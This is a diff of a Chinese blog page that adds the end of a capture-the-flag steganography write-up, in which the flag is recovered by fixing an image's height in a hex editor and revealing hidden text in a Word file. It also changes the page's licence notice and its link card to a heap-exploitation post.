+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570958055013-c3853f29-d513-49e5-a071-3c20fa9d46e6.png#align=left&amp;display=inline&amp;height=643&amp;name=rara.PNG&amp;originHeight=643&amp;originWidth=1280&amp;search=&amp;size=43817&amp;status=done&amp;width=1280" alt="rara.PNG"><br><strong>emmm，出来个压缩包和flag.docx！！！然鹅。。里面并没有文档flag。出题人出来受死。</strong><br><strong>转到压缩包。有密码。。。。。爆破。。。。没成功。</strong><br><strong>现在就一张图片。一个文档。。文档没啥，，那就图片，开搞。题目说瞅啥，，愁啥。。。那兔子向下看，难不成。。winhex怼上去。修改图片高度bingo！！！</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570959034222-b2ddcdc1-8165-40cc-8733-2ccbe04451bf.png#align=left&amp;display=inline&amp;height=382&amp;name=up.PNG&amp;originHeight=763&amp;originWidth=803&amp;search=&amp;size=1128473&amp;status=done&amp;width=402" alt="up.PNG"></strong><br><strong>解压压缩包又得到一个flag.docx，显示隐藏字符得到flag</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2019/png/518854/1570959239965-e1082ff8-6410-442b-859a-da4662df9f7f.png#align=left&amp;display=inline&amp;height=510&amp;name=234178269875.PNG&amp;originHeight=510&amp;originWidth=1366&amp;search=&amp;size=37657&amp;status=done&amp;width=1366" alt="234178269875.PNG"></strong><br><strong>
+</strong><br><strong>至此杂项结束！</strong></p>
 
             </div>
             <hr>
@@ -635,9 +609,21 @@ s<span class="token punctuation">.</span>interactive<span class="token punctuati
             <span>转载规则</span>
         </p>
         
-            <span>
-                请联系作者付费转载。
-            </span>
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png">
+                </a>
+            </div>
+            <br>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
+                    《校内平台杂项》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/06/校内练习平台杂项/" property="cc:attributionName" rel="cc:attributionURL">
+                Mondayice
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
         
     </div>
 
@@ -673,7 +659,8 @@ s<span class="token punctuation">.</span>interactive<span class="token punctuati
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2019/11/06/校内练习平台杂项/">
                     <div class="card-image">
@@ -695,9 +682,9 @@ s<span class="token punctuation">.</span>interactive<span class="token punctuati
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -706,6 +693,7 @@ s<span class="token punctuation">.</span>interactive<span class="token punctuati
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -724,24 +712,27 @@ s<span class="token punctuation">.</span>interactive<span class="token punctuati
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/05/20/sxj/">
+                <a href="/2019/05/23/Write-up_cn/">
                     <div class="card-image">
                         
+                        <img src="http://yanxuan.nosdn.127.net/83e01713bb4c086dae07364f238190b1.jpg" class="responsive-img" alt="RNote">
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="sxj">
-                        
-                        <span class="card-title">sxj</span>
+                        <span class="card-title">RNote</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            RCTF-2017: RNote【原理】off-by-one, fastbin_dup
+【目的】了解基础堆知识，懂得堆溢出漏洞的利用
+【环境】Linux
+【工具】gdb(装有peda)，IDA，python，pwntools
+【步骤】首先查
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-23
                             </span>
                         <span class="publish-author">
                             
@@ -750,6 +741,14 @@ s<span class="token punctuation">.</span>interactive<span class="token punctuati
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
                 </div>
                 
             </div>
